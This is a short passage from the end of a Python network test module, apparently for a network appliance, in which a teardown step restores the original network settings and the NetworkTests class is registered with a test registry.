        # Restore original settings to return to initial settings
        # print("orig_netsettings <%s>" % orig_netsettings)
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)


test_registry.register_module("network", NetworkTests)
